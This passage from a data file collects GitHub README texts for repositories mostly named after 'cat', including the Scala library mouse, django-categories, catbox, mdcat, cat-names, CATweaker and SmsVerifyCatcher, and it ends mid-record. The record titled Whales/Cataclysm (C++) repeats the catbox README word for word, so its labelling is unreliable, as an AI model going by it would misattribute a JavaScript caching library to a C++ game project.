java.net.URL(\"https://www.github.com\"))\nt1: scala.util.Try[java.net.URL] = Success(https://www.github.com)\n\nt1.cata(msg => s\"URL is valid!\", error => s\"URL is invalid: ${error.getMessage}\")\nres1: String = URL is valid!\n\nscala> t1.toEither\nres2: Either[Throwable,java.net.URL] = Right(https://www.github.com)\n\nscala> val t2 = scala.util.Try(new java.net.URL(\"https//www.github.com\"))\nt2: scala.util.Try[java.net.URL] = Failure(java.net.MalformedURLException: no protocol: https//www.github.com)\n\nscala> t2.cata(msg => s\"URL is valid!\", error => s\"URL is invalid: ${error.getMessage}\")\nres3: String = URL is invalid: no protocol: https//www.github.com\n\nscala> t2.toEither\nres4: Either[Throwable,java.net.URL] = Left(java.net.MalformedURLException: no protocol: https//www.github.com)\n\nscala> val intToBytes = 123456789.toByteArray\nintToBytes: Array[Byte] = Array(7, 91, -51, 21)\n\nscala> val longToBase64 = 123456789L.toBase64\nlongToBase64: String = AAAAAAdbzRU\n\nscala> 5.squared\nres0: Int = 25\n\nscala> 1.5 |> (_.toInt) |> (_.toString)\nres0: String = 1\n\n//lift a partial function into a total function to an Either, when you want to treat unhandled input cases as an error\nscala> liftEither[Option[Int]]({case Some(n) => n}, a => s\"Unexpected: $a\")(Some(6))\nliftEither[Option[Int]]({case Some(n) => n}, a => s\"Unexpected: $a\")(Some(6))\nres0: Either[String,Int] = Right(6)\n\nscala> val mapped = Map(1 -> 2, 3 -> 4).mapKeys(_ * 2)\nmapped: Map[Int,Int] = Map(2 -> 2, 6 -> 4)\nRelease Notes\nVersion 0.21 (May 19) is about support for Scala 2.13.0 RC1. Built against cats 2.0 M1.\nVersion 0.20 (Dec 18) adds syntax for Map and add support for Scala 2.13.0 M5. Built against cats 1.5.0.\nVersion 0.19 (Oct 18) adds syntax for F[A] and is built against cats 1.4.0. Support for Scala 2.10 is removed in this release.\nVersion 0.18 (Aug 18) adds PartialFunction lift to Either and is built against cats 1.2.0\nVersion 0.17 (Apr 18) is built against cats 1.1.0\nVersion 0.16 (Jan 18) is built against cats 1.0.1\nVersion 0.15 (Dec 17) is built against cats 1.0.0\nVersion 0.14 (Dec 17) include Int/Long/Double squared and is built against cats 1.0.0-RC2\nVersion 0.13 (Dec 17) include Int/Long/Double toByteArray and toBase64 operations and is built against cats 1.0.0-RC1\nVersion 0.12 (Nov 17) include Boolean Monoid operations and is built against cats 1.0.0-RC1\nVersion 0.11 (Oct 17) migrates to org.typelevel group and remains built against cats 1.0.0-MF\nVersion 0.10-MF (Aug 17) is built against cats 1.0.0-MF. It mainly supports compat testing for cats 1.0 release.\nVersion 0.9 (Jun 17) is built against cats 0.9, rename either->toEither on Try to align with 2.12 core changes.\nVersion 0.8 (Jun 17) is built against cats 0.9, cata and either on Try.\nVersion 0.7 (Apr 17) is built against cats 0.9, Boolean fold, Option right and left.\nVersion 0.6 (Nov 16) is built against cats 0.8.1 and migrates Xor boolean syntax to Either.\nVersion 0.5 (Aug 16) is built against cats 0.7.0 but otherwise unchanged.\nVersion 0.4 (July 2016) includes a breaking package rename from com.github.benhutchison.mouse -> mouse. Rationale was\nto follow cats and other modern libs convention of short, convenient package names.\nScope of Library\n\n\nProvide enrichments to classes from the Scala standard library that convert to Cats datatypes,\nor otherwise improve the functional programming experience.\n\n\nMake it easier to migrate source code between Scalaz and Cats.\n\n\nContributing\nIssues and pull requests are welcome. Code contributions should be aligned with the above scope to be included, and include unit tests.\nThis project supports the Scala code of conduct and aims that its channels\n(mailing list, Gitter, github, etc.) to be welcoming environments for everyone."}, {"title": "callowayproject/django-categories", "language": "Python", "content": "Django Categories\n\nDjango Categories grew out of our need to provide a basic hierarchical taxonomy management system that multiple applications could use independently or in concert.\nAs a news site, our stories, photos, and other content get divided into \"sections\" and we wanted all the apps to use the same set of sections. As our needs grew, the Django Categories grew in the functionality it gave to category handling within web pages.\n\nNew in 1.4\n\nSupport for Python 2.7, 3.4 and 3.5\nSupport for Django 1.9\nDropped support for Django 1.7 and older\n\n\nNew in 1.3\n\nSupport for Django 1.6, 1.7 and 1.8\nDropped support for Django versions 1.5 and below\n\n\nNew in 1.2\n\nSupport for Django 1.5\nDropped support for Django 1.2\nDropped caching within the app\nRemoved the old settings compatibility layer. Must use new dictionary-based settings!\n\n\nNew in 1.1\n\nFixed a cosmetic bug in the Django 1.4 admin. Action checkboxes now only appear once.\nTemplate tags are refactored to allow easy use of any model derived from CategoryBase.\nImproved test suite.\nImproved some of the documentation.\n\n\nUpgrade path from 1.0.2 to 1.0.3\nDue to some data corruption with 1.0.2 migrations, a partially new set of migrations has been written in 1.0.3; and this will cause issues for users on 1.0.2 version. There is also an issue with South version 0.7.4. South version 0.7.3 or 0.7.5 or greater works fine.\nFor a clean upgrade from 1.0.2 to 1.0.3 you have to delete previous version of 0010 migration (named 0010_changed_category_relation.py) and fakes the new 00010, 0011 and 0012.\nTherefore after installing new version of django-categories, for each project to upgrade you should execute the following commans in order:\npython manage.py migrate categories 0010_add_field_categoryrelation_category --fake --delete-ghost-migrations\npython manage.py migrate categories 0011_move_category_fks --fake\npython manage.py migrate categories 0012_remove_story_field --fake\npython manage.py migrate categories 0013_null_category_id\n\nThis way both the exact database layout and migration history is restored between the two installation paths (new installation from 1.0.3 and upgrade from 1.0.2 to 1.0.3).\nLast migration is needed to set the correct null value for category_id field when upgrading from 1.0.2 while is a noop for 1.0.3.\n\nNew in 1.0\n\nAbstract Base Class for generic hierarchical category models\nWhen you want a multiple types of categories and don't want them all part of the same model, you can now easily create new models by subclassing CategoryBase. You can also add additional metadata as necessary.\nYour model's can subclass CategoryBaseAdminForm and CategoryBaseAdmin to get the hierarchical management in the admin.\nSee the docs for more information.\n\nIncreased the default caching time on views\nThe default setting for CACHE_VIEW_LENGTH was 0, which means it would tell the browser to never cache the page. It is now 600, which is the default for CACHE_MIDDLEWARE_SECONDS\nUpdated for use with Django-MPTT 0.5\nJust a few tweaks.\nInitial compatibility with Django 1.4\nMore is coming, but at least it works.\nSlug transliteration for non-ASCII characters\nA new setting, SLUG_TRANSLITERATOR, allows you to specify a function for converting the non-ASCII characters to ASCII characters before the slugification. Works great with Unidecode.\n\n\nUpdated in 0.8.8\nThe editor app was placed inside the categories app, categories.editor, to avoid any name clashes.\n\nUpgrading\nA setting change is all that is needed:\nINSTALLED_APPS = (\n    'categories',\n    'categories.editor',\n)\n\n\nNew in 0.8\n\nAdded an active field\nAs an alternative to deleting categories, you can make them inactive.\nAlso added a manager method active() to query only the active categories and added Admin Actions to activate or deactivate an item.\n\nImproved import\nPreviously the import saved items in the reverse order to the imported file. Now them import in order.\n\n\nNew in 0.7\n\nAdded South migrations\nAll the previous SQL scripts have been converted to South migrations.\nCan add category fields via management command (and South)\nThe new ability to setup category relationships in settings.py works fine if you are starting from scratch, but not if you want to add it after you have set up the database. Now there is a management command to make sure all the correct fields and tables are created.\nAdded an alternate_url field\nThis allows the specification of a URL that is not derived from the category hierarchy.\nNew JAVASCRIPT_URL setting\nThis allows some customization of the genericcollections.js file.\nNew get_latest_objects_by_category template tag\nThis will do pretty much what it says.\n\n\nNew in 0.6\n\nClass-based views\nWorks great with Django 1.3 or django-cbv\nNew Settings infrastructure\nTo be more like the Django project, we are migrating from individual CATEGORIES_* settings to a dictionary named CATEGORIES_SETTINGS. Use of the previous settings will still work but will generate a DeprecationError.\nThe tree's initially expanded state is now configurable\nEDITOR_TREE_INITIAL_STATE allows a collapsed or expanded value. The default is collapsed.\nOptional Thumbnail field\nHave a thumbnail for each category!\n\"Categorize\" models in settings\nNow you don't have to modify the model to add a Category relationship. Use the new settings to \"wire\" categories to different models.\n\n\nFeatures of the project\n\nMultiple trees, or a single tree\nYou can treat all the records as a single tree, shared by all the applications. You can also treat each of the top level records as individual trees, for different apps or uses.\nEasy handling of hierarchical data\nWe use Django MPTT to manage the data efficiently and provide the extra access functions.\nEasy importation of data\nImport a tree or trees of space- or tab-indented data with a Django management command.\nMetadata for better SEO on web pages\nInclude all the metadata you want for easy inclusion on web pages.\nLink uncategorized objects to a category\nAttach any number of objects to a category, even if the objects themselves aren't categorized.\nHierarchical Admin\nShows the data in typical tree form with disclosure triangles\nTemplate Helpers\nEasy ways for displaying the tree data in templates:\n\nShow one level of a tree\nAll root categories or just children of a specified category\nShow multiple levels\nAncestors of category, category and all children of category or  a category and its children"}, {"title": "hapijs/catbox", "language": "JavaScript", "content": "catbox\nMulti-strategy object caching service\n\ncatbox is a multi-strategy key-value object store. It comes with extensions supporting a memory\ncache, Redis, and Memcached. Additional providers from the\ncommunity can be found on the npm Registry.\ncatbox provides two interfaces: a low-level Client and a high-level Policy.\nInstallation\nIn order to reduce module dependencies, catbox does not include the external caching\nstrategies. To use other strategies, each service must be manually installed via npm or package\ndependencies manually. The available strategies are:\n\nMemory\nRedis\nMemcached\n\nClient\nThe Client object provides a low-level cache abstraction. The object is constructed using\nnew Client(engine, options) where:\n\nengine - is an object or a prototype function implementing the cache strategy:\n\nfunction - a prototype function with the signature function(options). catbox will call\nnew func(options).\nobject - a pre instantiated client implementation object. Does not support passing options.\n\n\noptions - the strategy configuration object. Each strategy defines its own configuration\noptions with the following common options:\n\npartition - the partition name used to isolate the cached results across multiple clients.\nThe partition name is used as the MongoDB database name, the Riak bucket, or as a key prefix\nin Redis and Memcached. To share the cache across multiple clients, use the same partition\nname.\n\n\n\nNote that any implementation of client strategies must return deep copies of the stored data as the\nAPI assumes that the object returned from a get() is owned by the called and can be safely\nmodified without affecting the cache copy.\nAPI\nThe Client object provides the following methods:\n\nawait start() - creates a connection to the cache server. Must be called before any other\nmethod is available. Any errors are thrown.\nawait stop() - terminates the connection to the cache server.\nawait get(key) - retrieve an item from the cache engine if found where:\n\nkey - a cache key object (see below).\nreturn value:\n\nnull is the item is not found.\nthrows an error if the request failed.\notherwise, an object with the following properties:\n\nitem - the value stored in the cache using set().\nstored - the timestamp when the item was stored in the cache (in milliseconds).\nttl - the remaining time-to-live (not the original value used when storing the\nobject).\n\n\n\n\n\n\nawait set(key, value, ttl) - store an item in the cache for a specified length of time, where:\n\nkey - a cache key object (see below).\nvalue - the string or object value to be stored.\nttl - a time-to-live value in milliseconds after which the item is automatically removed\nfrom the cache (or is marked invalid).\nany errors are thrown.\n\n\nawait drop(key) - remove an item from cache where:\n\nkey - a cache key object (see below).\nany errors are thrown.\n\n\nisReady() - returns true if cache engine determines itself as ready, false if it is not\nready.\nvalidateSegmentName(segment) - returns null if the segment name is valid (see below),\notherwise should return an instance of Error with an appropriate message.\n\nAny method with a key argument takes an object with the following required properties:\n\nsegment - a caching segment name string. Enables using a single cache server for storing\ndifferent sets of items with overlapping ids.\nid - a unique item identifier string (per segment). Can be an empty string.\n\nPolicy\nThe Policy object provides a convenient cache interface by setting a global policy which is\nautomatically applied to every storage action. The object is constructed using\nnew Policy(options, [cache, segment]) where:\n\noptions - is an object with the following optional keys (unless noted otherwise):\n\nexpiresIn - relative expiration expressed in the number of milliseconds since the item was\nsaved in the cache. Cannot be used together with expiresAt.\nexpiresAt - time of day expressed in 24h notation using the 'HH:MM' format, at which point\nall cache records for the route expire. Uses local time. Cannot be used together with\nexpiresIn.\ngenerateFunc - a function used to generate a new cache item if one is not found in the\ncache when calling get(). The method's signature is async function(id, flags) where:\n\nid - the id string or object provided to the get() method.\nflags - an object used to pass back additional flags:\n\nttl - the cache ttl value in milliseconds. Set to 0 to skip storing in the cache.\nDefaults to the cache global policy.\n\n\n\n\nstaleIn - number of milliseconds to mark an item stored in cache as stale and attempt to\nregenerate it when generateFunc is provided. Must be less than expiresIn. Alternatively\nfunction that returns staleIn value in milliseconds. The function signature is\nfunction(stored, ttl) where:\n\nstored - the timestamp when the item was stored in the cache (in milliseconds).\nttl - the remaining time-to-live (not the original value used when storing the object).\n\n\nstaleTimeout - number of milliseconds to wait before returning a stale value while\ngenerateFunc is generating a fresh value.\ngenerateTimeout - number of milliseconds to wait before returning a timeout error when the\ngenerateFunc function takes too long to return a value. When the value is eventually\nreturned, it is stored in the cache for future requests. Required if generateFunc is\npresent. Set to false to disable timeouts which may cause all get() requests to get stuck\nforever.\ndropOnError - if true, an error or timeout in the generateFunc causes the stale value\nto be evicted from the cache. Defaults  to true.\ngenerateOnReadError - if false, an upstream cache read error will stop the get() method\nfrom calling the generate function and will instead pass back the cache error. Defaults to\ntrue.\ngenerateIgnoreWriteError - if false, an upstream cache write error will be passed back\nwith the generated value when calling the get() method. Defaults to true.\npendingGenerateTimeout - number of milliseconds while generateFunc call is in progress for\na given id, before a subsequent generateFunc call is allowed. Defaults to 0, no blocking of\nconcurrent generateFunc calls beyond staleTimeout.\ngetDecoratedValue - if true, the return value of policy.get() calls is an object with\n{ value, cached, report }. Defaults to false which returns a plain value.\n\n\ncache - a Client instance (which has already been started).\nsegment - required when cache is provided. The segment name used to isolate cached items\nwithin the cache partition.\n\nAPI\nThe Policy object provides the following methods:\n\nawait get(id) - retrieve an item from the cache. If the item is not found and the\ngenerateFunc method was provided, a new value is generated, stored in the cache, and returned.\nMultiple concurrent requests are queued and processed once. The method arguments are:\n\nid - the unique item identifier (within the policy segment). Can be a string or an object\nwith the required 'id' key.\nreturn value:\n\nthe requested item if found, otherwise null.\nany errors are thrown.\nif getDecoratedValue is true, returns an object with the following properties:\n\nvalue - the fetched or generated value.\ncached - null if a valid item was not found in the cache, or an object with the\nfollowing keys:\n\nitem - the cached value.\nstored - the timestamp when the item was stored in the cache.\nttl - the cache ttl value for the record.\nisStale - true if the item is stale.\n\n\nreport - an object with logging information about the generation operation\ncontaining the following keys (as relevant):\n\nmsec - the cache lookup time in milliseconds.\nstored - the timestamp when the item was stored in the cache.\nisStale - true if the item is stale.\nttl - the cache ttl value for the record.\nerror - lookup error.\n\n\n\n\n\n\n\n\nawait set(id, value, ttl) - store an item in the cache where:\n\nid - the unique item identifier (within the policy segment).\nvalue - the string or object value to be stored.\nttl - a time-to-live override value in milliseconds after which the item is\nautomatically removed from the cache (or is marked invalid). This should be set to 0 in\norder to use the caching rules configured when creating the Policy object.\nany errors are thrown.\n\n\nawait drop(id) - remove the item from cache where:\n\nid - the unique item identifier (within the policy segment).\nany errors are thrown.\n\n\nttl(created) - given a created timestamp in milliseconds, returns the time-to-live left based\non the configured rules.\nrules(options) - changes the policy rules after construction (note that items already stored\nwill not be affected) where:\n\noptions - the same options as the Policy constructor.\n\n\nisReady() - returns true if cache engine determines itself as ready, false if it is not\nready or if there is no cache engine set.\nstats - an object with cache statistics where:\n\nsets - number of cache writes.\ngets - number of cache get() requests.\nhits - number of cache get() requests in which the requested id was found in the cache\n(can be stale).\nstales - number of cache reads with stale requests (only counts the first request in a\nqueued get() operation).\ngenerates - number of calls to the generate function.\nerrors - cache operations errors.\n\n\nevents - a podium event emitter, emitting 'error'\nevents under the following channels:\n\n'persist' - emits any cache errors thrown during the generation of new values as a result\nof a get() request.\n'generate' - emits any new value generation errors thrown as a result of a get() request.\n\n\n\nNote that errors generated by set() and drop() are reported directly by the functions calls and\nare not included in the reported events."}, {"title": "Whales/Cataclysm", "language": "C++", "content": "catbox\nMulti-strategy object caching service\n\ncatbox is a multi-strategy key-value object store. It comes with extensions supporting a memory\ncache, Redis, and Memcached. Additional providers from the\ncommunity can be found on the npm Registry.\ncatbox provides two interfaces: a low-level Client and a high-level Policy.\nInstallation\nIn order to reduce module dependencies, catbox does not include the external caching\nstrategies. To use other strategies, each service must be manually installed via npm or package\ndependencies manually. The available strategies are:\n\nMemory\nRedis\nMemcached\n\nClient\nThe Client object provides a low-level cache abstraction. The object is constructed using\nnew Client(engine, options) where:\n\nengine - is an object or a prototype function implementing the cache strategy:\n\nfunction - a prototype function with the signature function(options). catbox will call\nnew func(options).\nobject - a pre instantiated client implementation object. Does not support passing options.\n\n\noptions - the strategy configuration object. Each strategy defines its own configuration\noptions with the following common options:\n\npartition - the partition name used to isolate the cached results across multiple clients.\nThe partition name is used as the MongoDB database name, the Riak bucket, or as a key prefix\nin Redis and Memcached. To share the cache across multiple clients, use the same partition\nname.\n\n\n\nNote that any implementation of client strategies must return deep copies of the stored data as the\nAPI assumes that the object returned from a get() is owned by the called and can be safely\nmodified without affecting the cache copy.\nAPI\nThe Client object provides the following methods:\n\nawait start() - creates a connection to the cache server. Must be called before any other\nmethod is available. Any errors are thrown.\nawait stop() - terminates the connection to the cache server.\nawait get(key) - retrieve an item from the cache engine if found where:\n\nkey - a cache key object (see below).\nreturn value:\n\nnull is the item is not found.\nthrows an error if the request failed.\notherwise, an object with the following properties:\n\nitem - the value stored in the cache using set().\nstored - the timestamp when the item was stored in the cache (in milliseconds).\nttl - the remaining time-to-live (not the original value used when storing the\nobject).\n\n\n\n\n\n\nawait set(key, value, ttl) - store an item in the cache for a specified length of time, where:\n\nkey - a cache key object (see below).\nvalue - the string or object value to be stored.\nttl - a time-to-live value in milliseconds after which the item is automatically removed\nfrom the cache (or is marked invalid).\nany errors are thrown.\n\n\nawait drop(key) - remove an item from cache where:\n\nkey - a cache key object (see below).\nany errors are thrown.\n\n\nisReady() - returns true if cache engine determines itself as ready, false if it is not\nready.\nvalidateSegmentName(segment) - returns null if the segment name is valid (see below),\notherwise should return an instance of Error with an appropriate message.\n\nAny method with a key argument takes an object with the following required properties:\n\nsegment - a caching segment name string. Enables using a single cache server for storing\ndifferent sets of items with overlapping ids.\nid - a unique item identifier string (per segment). Can be an empty string.\n\nPolicy\nThe Policy object provides a convenient cache interface by setting a global policy which is\nautomatically applied to every storage action. The object is constructed using\nnew Policy(options, [cache, segment]) where:\n\noptions - is an object with the following optional keys (unless noted otherwise):\n\nexpiresIn - relative expiration expressed in the number of milliseconds since the item was\nsaved in the cache. Cannot be used together with expiresAt.\nexpiresAt - time of day expressed in 24h notation using the 'HH:MM' format, at which point\nall cache records for the route expire. Uses local time. Cannot be used together with\nexpiresIn.\ngenerateFunc - a function used to generate a new cache item if one is not found in the\ncache when calling get(). The method's signature is async function(id, flags) where:\n\nid - the id string or object provided to the get() method.\nflags - an object used to pass back additional flags:\n\nttl - the cache ttl value in milliseconds. Set to 0 to skip storing in the cache.\nDefaults to the cache global policy.\n\n\n\n\nstaleIn - number of milliseconds to mark an item stored in cache as stale and attempt to\nregenerate it when generateFunc is provided. Must be less than expiresIn. Alternatively\nfunction that returns staleIn value in milliseconds. The function signature is\nfunction(stored, ttl) where:\n\nstored - the timestamp when the item was stored in the cache (in milliseconds).\nttl - the remaining time-to-live (not the original value used when storing the object).\n\n\nstaleTimeout - number of milliseconds to wait before returning a stale value while\ngenerateFunc is generating a fresh value.\ngenerateTimeout - number of milliseconds to wait before returning a timeout error when the\ngenerateFunc function takes too long to return a value. When the value is eventually\nreturned, it is stored in the cache for future requests. Required if generateFunc is\npresent. Set to false to disable timeouts which may cause all get() requests to get stuck\nforever.\ndropOnError - if true, an error or timeout in the generateFunc causes the stale value\nto be evicted from the cache. Defaults  to true.\ngenerateOnReadError - if false, an upstream cache read error will stop the get() method\nfrom calling the generate function and will instead pass back the cache error. Defaults to\ntrue.\ngenerateIgnoreWriteError - if false, an upstream cache write error will be passed back\nwith the generated value when calling the get() method. Defaults to true.\npendingGenerateTimeout - number of milliseconds while generateFunc call is in progress for\na given id, before a subsequent generateFunc call is allowed. Defaults to 0, no blocking of\nconcurrent generateFunc calls beyond staleTimeout.\ngetDecoratedValue - if true, the return value of policy.get() calls is an object with\n{ value, cached, report }. Defaults to false which returns a plain value.\n\n\ncache - a Client instance (which has already been started).\nsegment - required when cache is provided. The segment name used to isolate cached items\nwithin the cache partition.\n\nAPI\nThe Policy object provides the following methods:\n\nawait get(id) - retrieve an item from the cache. If the item is not found and the\ngenerateFunc method was provided, a new value is generated, stored in the cache, and returned.\nMultiple concurrent requests are queued and processed once. The method arguments are:\n\nid - the unique item identifier (within the policy segment). Can be a string or an object\nwith the required 'id' key.\nreturn value:\n\nthe requested item if found, otherwise null.\nany errors are thrown.\nif getDecoratedValue is true, returns an object with the following properties:\n\nvalue - the fetched or generated value.\ncached - null if a valid item was not found in the cache, or an object with the\nfollowing keys:\n\nitem - the cached value.\nstored - the timestamp when the item was stored in the cache.\nttl - the cache ttl value for the record.\nisStale - true if the item is stale.\n\n\nreport - an object with logging information about the generation operation\ncontaining the following keys (as relevant):\n\nmsec - the cache lookup time in milliseconds.\nstored - the timestamp when the item was stored in the cache.\nisStale - true if the item is stale.\nttl - the cache ttl value for the record.\nerror - lookup error.\n\n\n\n\n\n\n\n\nawait set(id, value, ttl) - store an item in the cache where:\n\nid - the unique item identifier (within the policy segment).\nvalue - the string or object value to be stored.\nttl - a time-to-live override value in milliseconds after which the item is\nautomatically removed from the cache (or is marked invalid). This should be set to 0 in\norder to use the caching rules configured when creating the Policy object.\nany errors are thrown.\n\n\nawait drop(id) - remove the item from cache where:\n\nid - the unique item identifier (within the policy segment).\nany errors are thrown.\n\n\nttl(created) - given a created timestamp in milliseconds, returns the time-to-live left based\non the configured rules.\nrules(options) - changes the policy rules after construction (note that items already stored\nwill not be affected) where:\n\noptions - the same options as the Policy constructor.\n\n\nisReady() - returns true if cache engine determines itself as ready, false if it is not\nready or if there is no cache engine set.\nstats - an object with cache statistics where:\n\nsets - number of cache writes.\ngets - number of cache get() requests.\nhits - number of cache get() requests in which the requested id was found in the cache\n(can be stale).\nstales - number of cache reads with stale requests (only counts the first request in a\nqueued get() operation).\ngenerates - number of calls to the generate function.\nerrors - cache operations errors.\n\n\nevents - a podium event emitter, emitting 'error'\nevents under the following channels:\n\n'persist' - emits any cache errors thrown during the generation of new values as a result\nof a get() request.\n'generate' - emits any new value generation errors thrown as a result of a get() request.\n\n\n\nNote that errors generated by set() and drop() are reported directly by the functions calls and\nare not included in the reported events."}, {"title": "lunaryorn/mdcat", "language": "Rust", "content": "mdcat\n\n\n\n\ncat for Markdown (that is, CommonMark):\n$ mdcat sample.md\n\n\nmdcat in iTerm2, with Dracula, and Solarized Light and Dark (from left to\nright), and PragmataPro as font.\nFeatures\nmdcat works best with iTerm2 or a compatible terminal emulator, and a good\nterminal font with italic characters.  Then it\n\nnicely renders all basic CommonMark syntax (no tables or footnotes though),\nhighlights code blocks with syntect,\nshows links and images inline in supported terminals (see above, where \"Pixabay\" is a clickable link!),\nadds jump marks for headings in iTerm2 (jump forwards and backwards with\n\u21e7\u2318\u2193 and \u21e7\u2318\u2191).\n\n\n\n\nTerminal\nBasic syntax\nSyntax highlighting\nLinks\nImages\nJump marks\n\n\n\n\nBasic ANSI\n\u2713\n\u2713\n\n\n\n\n\nWindows ConEmu\u00b9\n\u2713\n\u2713\n\n\n\n\n\nWindows 10 console\u00b9\n\u2713\n\u2713\n\n\n\n\n\nVTE 0.50 or newer based\n\u2713\n\u2713\n\u2713\n\n\n\n\nTerminology\n\u2713\n\u2713\n\u2713\n\u2713\n\n\n\niTerm2\n\u2713\n\u2713\n\u2713\n\u2713\n\u2713\n\n\n\n1: On Windows you need to install with --no-default-features (see below).\nNot supported:\n\nCommonMark extensions: Footnotes and tables\nRe-filling paragraphs\n\nInstallation\nBinaries\nThe Releases page provides pre-build binaries for Linux, macOS and Windows.\nUse these binaries to try mdcat, particularly on Windows.\n3rd party packages\nSome package managers include mdcat:\n\nHomebrew: brew install mdcat\nArch Linux: mdcat in AUR\nVoid Linux: xbps-install -S mdcat\nOpenBSD: port via EPBSD\n\nWhile these packages may not always be up to date we generally recommend to use\nthese to keep mdcat updated with the rest of the system.\nBuilding with rustup\nYou can also build mdcat manually with cargo.  Install Rust via rustup and\nrun cargo install mdcat.  To keep mdcat up to date install cargo-update and\nrun cargo install-update mdcat.\nNote: On Windows you likely need --no-default-features to make mdcat\nbuild.\nSVG support\nmdcat needs rsvg-convert to show SVG images in iTerm2; otherwise mdcat\nonly shows the image title and URL for SVG images.  Install with brew install librsvg.\nTerminology supports SVG out of the box and needs no additional tools.\nFuture plans\n\n Figure out a better way to show HTML GH-3.\n CommonMark extensions: Footnotes GH-1.\n CommonMark extensions: Tables GH-2.\n Ignore soft wraps and wrap inline text a column limit instead GH-4.\n\nLicense\nCopyright 2018-2019 Sebastian Wiesner sebastian@swsnr.de\nLicensed under the Apache License, Version 2.0 (the \"License\"); you may not use\nthis file except in compliance with the License. You may obtain a copy of the\nLicense at http://www.apache.org/licenses/LICENSE-2.0.\nUnless required by applicable law or agreed to in writing, software distributed\nunder the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR\nCONDITIONS OF ANY KIND, either express or implied. See the License for the\nspecific language governing permissions and limitations under the License."}, {"title": "sindresorhus/cat-names", "language": "JavaScript", "content": "cat-names \n\nGet popular cat names\n\n\nThe name list is just a JSON file and can be used anywhere.\nI'm not accepting PRs for additional names.\nInstall\n$ npm install cat-names\n\nUsage\nconst catNames = require('cat-names');\n\ncatNames.all;\n//=> ['Abby', 'Angel', \u2026]\n\ncatNames.random();\n//=> 'Max'\nAPI\n.all\nType: string[]\nTop 100 cat names in alphabetical order.\n.random()\nType: Function\nRandom cat name.\nCLI\n$ npm install --global cat-names\n\n$ cat-names --help\n\n  Examples\n    $ cat-names\n    Max\n\n    $ cat-names --all\n    Abby\n    Angel\n    \u2026\n\n  Options\n    --all  Get all names instead of a random name\n\nRelated\n\ndog-names - Get popular dog names\npokemon - Get Pok\u00e9mon names\nsuperb - Get superb like words\nsuperheroes - Get superhero names\nsupervillains - Get supervillain names\nrandom-tree-names - Get tree names\nyes-no-words - Get yes/no like words\n\nLicense\nMIT \u00a9 Sindre Sorhus"}, {"title": "keefo/CATweaker", "language": "Objective-C", "content": "CATweaker   \n\nOverview\nA helper tool for creating beautiful CAMediaTimingFunction curve.\n\nCATweaker comes with an Xcode plugin:\nCATweakerSense for Xcode\nOverview\nCATweakerSense is an Xcode plugin that makes working with CAMediaTimingFunction more visual.\nYou might use ColorSense before. It let you pick up a color right from Xcode caret.\nCATweakerSense is like ColorSense, but it lets you pick a CAMediaTimingFunction curve. When you put the caret on one of your CAMediaTimingFunction, it automatically shows the actual time curve as an overlay, and you can even adjust it on-the-fly with the curve adjuster.\nThe plugin also adds some items to the Edit menu to enable and to disable CATweakerSense temporarily. These menu items have no keyboard shortcuts by default, but you can set them via the system's keyboard preferences (Xcode's own preferences won't show them).\n\n\nInstallation\nInstall via Alcatraz.\nOr\nSimply build the Xcode project and restart Xcode. The plugin will automatically be installed in ~/Library/Application Support/Developer/Shared/Xcode/Plug-ins. To uninstall, just remove the plugin from there (and restart Xcode).\nIf you get a \"Permission Denied\" error while building, please see this issue.\nThis is tested on:\n\nOS X 10.9.2 with Xcode 6.2\nOS X 10.10.3 with Xcode 6.2\nOS X 10.11 with Xcode 7.0.1\n\nLimitations\n\nIt only works for constant point value, something like [CAMediaTimingFunction functionWithControlPoints: abc/def : 0.1 : 0.15 : 0.9]; won't work.\nIt only works for Objective-C code. Swift support is in todo list.\n\nNext move\nI am planing to bring keyFrame animation into this plugin. So one can create more complex animation like \"spring\", \"decay\", \"along path\" through the popover adjuster. If you have some great ideas, I am more than happy to hear from you.\nSwift language support.\nCredits\nThis work is derived from the awesome ColorSense plugin of Ole Zorn(@olemoritz). Thanks Ole!\nAuthor\nXu Lian\nI'm a Mac and iOS developer, the founder of  Beyondcow, follow me on Twitter or Github.\n\nhttps://twitter.com/lianxu\nhttps://github.com/keefo\nhttp://lianxu.me\n\nLicense\nCATweaker & CATweakerSense is published under MIT License\n\nCopyright (c) 2015 Xu Lian (@lianxu)\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of\nthis software and associated documentation files (the \"Software\"), to deal in\nthe Software without restriction, including without limitation the rights to use,\ncopy, modify, merge, publish, distribute, sublicense, and/or sell copies of the\nSoftware, and to permit persons to whom the Software is furnished to do so,\nsubject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS\nFOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR\nCOPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER\nIN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\nCONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE."}, {"title": "honcheng/CATransform3D-Test", "language": "Objective-C", "content": "CATransform3D-Test\nA test app to visualize view transformation when values in CATransform3D matrices change. Wrote this test app to learn more about CATransform3D.\n\nadjustable m11 to m44 values\nadjustable anchor point\nrotate view in x,y,z\nuse gestures to rotate,translate,scale"}, {"title": "stfalcon-studio/SmsVerifyCatcher", "language": "Java", "content": "SmsVerifyCatcher\n   \n\nA library for implementing interception of SMS with a verification code using a few lines of code.\nWho we are\nNeed iOS and Android apps, MVP development or prototyping? Contact us via info@stfalcon.com. We develop software since 2009, and we're known experts in this field. Check out our portfolio and see more libraries from stfalcon-studio.\nDownload\nDownload via Gradle:\ncompile 'com.github.stfalcon:smsverifycatcher:0.3.2'\nor Maven:\n<dependency>\n  <groupId>com.github.stfalcon</groupId>\n  <artifactId>smsverifycatcher</artifactId>\n  <version>0.3.2</version>\n  <type>pom</type>\n</dependency>\nUsage\nAdd permissions to AndroidManifest.xml:\n  <uses-permission android:name=\"android.permission.RECEIVE_SMS\" />\n  <uses-permission android:name=\"android.permission.READ_SMS\" />\nInit SmsVerifyCatcher in method like onCreate activity:\n    smsVerifyCatcher = new SmsVerifyCatcher(this, new OnSmsCatchListener<String>() {\n        @Override\n        public void onSmsCatch(String message) {\n            String code = parseCode(message);//Parse verification code\n            etCode.setText(code);//set code in edit 